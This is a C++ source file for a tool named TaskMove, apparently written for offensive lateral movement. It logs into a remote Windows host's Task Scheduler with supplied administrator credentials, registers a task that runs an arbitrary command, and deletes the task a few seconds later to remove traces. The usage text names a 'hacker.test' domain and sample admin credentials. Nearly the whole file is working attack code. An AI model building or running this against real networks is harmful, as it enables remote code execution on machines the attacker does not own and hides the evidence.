#define _WIN32_DCOM

#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <comdef.h>
#include <wincred.h>
//  Include the task header file.
#include <taskschd.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "credui.lib")

using namespace std;

int __cdecl wmain(int argc, wchar_t* argv[])
{
    if (argc < 5) {
        wprintf(TEXT("TaskMove.exe <Host> <Username> <Password> <Command> [Domain] \n"));
        wprintf(TEXT("Usage: \n"));
        wprintf(TEXT("TaskMove.exe 192.168.3.130 Administrator 123456 whoami hacker.test\n"));
        wprintf(TEXT("TaskMove.exe 192.168.3.130 Administrator 123456 whoami\n"));
        return 0;
    }

    LPCWSTR lpwDomain; // 域名
    if (argc == 6) 
    {
        lpwDomain = argv[5];
    }
    else
    {
        lpwDomain = NULL;
    }
    LPCWSTR wsCommand = argv[4]; // 执行命令
    LPCWSTR lpwsHost = argv[1]; // 目标机器地址
    LPCWSTR lpwsUserName = argv[2]; // 账号
    LPCWSTR lpwsPassword = argv[3]; // 密码

    LPCWSTR wszTaskName = L"Test Task";


    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);  //初始化COM组件
    if (FAILED(hr))
    {
        printf("\nCoInitializeEx failed: %x", hr);
        return 1;
    }

    hr = CoInitializeSecurity(NULL,-1,NULL,NULL,RPC_C_AUTHN_LEVEL_PKT_PRIVACY,RPC_C_IMP_LEVEL_IMPERSONATE,NULL,0,NULL);  //初始化COM安全

    if (FAILED(hr))
    {
        printf("\nCoInitializeSecurity failed: %x", hr);
        CoUninitialize();
        return 1;
    }

    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler,NULL,CLSCTX_INPROC_SERVER,IID_ITaskService,(void**)&pService);  //创建CLSID实例
    if (FAILED(hr))
    {
        printf("Failed to create an instance of ITaskService: %x", hr);
        CoUninitialize();
        return 1;
    }

    hr = pService->Connect(_variant_t(_bstr_t(lpwsHost)), _variant_t(_bstr_t(lpwsUserName)), _variant_t(_bstr_t(lpwDomain)), _variant_t(_bstr_t(lpwsPassword)));
    if (FAILED(hr))
    {
        printf("ITaskService::Connect failed: %x", hr);
        pService->Release();
        CoUninitialize();
        return 1;
    }

    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);   //判断是否已存在
    if (FAILED(hr))
    {
        printf("Cannot get Root Folder pointer: %x", hr);
        pService->Release();
        CoUninitialize();
        return 1;
    }

    hr = pRootFolder->DeleteTask(_bstr_t(wszTaskName), 0);

    ITaskDefinition* pTask = NULL;
    hr = pService->NewTask(0, &pTask);

    pService->Release();  //
    if (FAILED(hr))
    {
        printf("Failed to create a task definition: %x", hr);
        pRootFolder->Release();
        CoUninitialize();
        return 1;
    }

    IRegistrationInfo* pRegInfo = NULL;
    hr = pTask->get_RegistrationInfo(&pRegInfo);
    if (FAILED(hr))
    {
        printf("\nCannot get identification pointer: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    hr = pRegInfo->put_Author(_bstr_t("Author Name"));  //创建者
    pRegInfo->Release();
    if (FAILED(hr))
    {
        printf("\nCannot put identification info: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    IPrincipal* pPrincipal = NULL;
    hr = pTask->get_Principal(&pPrincipal);  //优先级
    if (FAILED(hr))
    {
        printf("\nCannot get principal pointer: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    hr = pPrincipal->put_Id(_bstr_t(L"Principal1"));  //ID
    if (FAILED(hr))
        printf("\nCannot put the principal ID: %x", hr);

    hr = pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN); //Logon Type
    if (FAILED(hr))
        printf("\nCannot put principal logon type: %x", hr);

    hr = pPrincipal->put_RunLevel(TASK_RUNLEVEL_LUA);  //运行级别
    pPrincipal->Release();
    if (FAILED(hr))
    {
        printf("\nCannot put principal run level: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    ITaskSettings* pSettings = NULL;
    hr = pTask->get_Settings(&pSettings);
    if (FAILED(hr))
    {
        printf("\nCannot get settings pointer: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);  //是否可执行
    pSettings->Release();
    if (FAILED(hr))
    {
        printf("\nCannot put setting info: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    ITriggerCollection* pTriggerCollection = NULL;
    hr = pTask->get_Triggers(&pTriggerCollection);
    if (FAILED(hr))
    {
        printf("\nCannot get trigger collection: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    ITrigger* pTrigger = NULL;
    hr = pTriggerCollection->Create(TASK_TRIGGER_REGISTRATION, &pTrigger);
    pTriggerCollection->Release();
    if (FAILED(hr))
    {
        printf("\nCannot create a registration trigger: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    IRegistrationTrigger* pRegistrationTrigger = NULL;
    hr = pTrigger->QueryInterface(IID_IRegistrationTrigger, (void**)&pRegistrationTrigger);
    pTrigger->Release();
    if (FAILED(hr))
    {
        printf("\nQueryInterface call failed on IRegistrationTrigger: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    hr = pRegistrationTrigger->put_Id(_bstr_t(L"Trigger1"));
    if (FAILED(hr)) printf("\nCannot put trigger ID: %x", hr);

    hr = pRegistrationTrigger->put_Delay(_bstr_t("PT1S"));
    pRegistrationTrigger->Release();
    if (FAILED(hr))
    {
        printf("\nCannot put registration trigger delay: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }
  
    IActionCollection* pActionCollection = NULL;

    hr = pTask->get_Actions(&pActionCollection);
    if (FAILED(hr))
    {
        printf("\nCannot get Task collection pointer: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    IAction* pAction = NULL;
    hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
    pActionCollection->Release();
    if (FAILED(hr))
    {
        printf("\nCannot create action: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    IExecAction* pExecAction = NULL;

    hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
    pAction->Release();
    if (FAILED(hr))
    {
        printf("\nQueryInterface call failed for IExecAction: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    hr = pExecAction->put_Path(_bstr_t(wsCommand)); 
    pExecAction->Release();
    if (FAILED(hr))
    {
        printf("\nCannot put the action executable path: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    IRegisteredTask* pRegisteredTask = NULL;
    hr = pRootFolder->RegisterTaskDefinition(_bstr_t(wszTaskName),pTask,TASK_CREATE_OR_UPDATE,_variant_t(),_variant_t(),TASK_LOGON_INTERACTIVE_TOKEN,_variant_t(L""),&pRegisteredTask);
    if (FAILED(hr))
    {
        printf("\nError saving the Task : %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    printf("\n任务成功注册.");
    Sleep(3000);   //这里等待三秒，确保任务触发

    //  Clean up.
    pRootFolder->DeleteTask(_bstr_t(wszTaskName), 0);
    pRootFolder->Release();
    pService->Release();
    pTask->Release();
    pRegisteredTask->Release();
    CoUninitialize();
    return 0;
}